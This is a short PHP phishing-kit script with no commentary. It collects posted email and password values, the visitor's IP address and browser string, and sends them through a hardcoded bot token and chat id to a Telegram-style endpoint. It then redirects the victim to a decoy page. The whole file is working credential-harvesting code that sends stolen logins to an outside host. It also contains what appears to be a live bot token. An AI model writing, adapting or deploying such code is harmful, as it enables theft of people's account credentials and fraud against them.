<?php
ob_start();
$zabi = getenv("REMOTE_ADDR");
$message = "-------DKK----------\n";
$message .= "Email : ".$_POST['zz']."\n";
$message .= "Pass : ".$_POST['aa']."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------DKK---------------------\n";
$token = "6142767231:AAF7XMRwFlMFjBKNgFHFPwDGWPJH5M3vvfE";
$data = [
    'text' => $message,
    'chat_id' => '-5143241668'
];
$response = @file_get_contents("https://telegram.org?" . http_build_query($data));

header("Location: /dk/api/brbrb/bet.html");
exit();
